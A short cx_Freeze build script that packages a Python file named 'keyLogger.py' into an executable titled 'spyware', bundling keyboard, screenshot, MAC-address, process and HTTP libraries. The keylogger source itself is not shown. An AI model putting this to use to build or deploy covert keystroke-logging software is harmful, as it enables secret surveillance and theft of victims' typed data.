from cx_Freeze import setup, Executable

build_exe_options = {"packages": ["os"], "includes": ["keyboard", "psutil", "requests", "getmac", "PIL", "threading"]}

base = None

setup(
    name="spyware",
    version="0.1",
    description="spyware",
    options={"build_exe": build_exe_options},
    executables=[Executable("keyLogger.py", base=base)]
)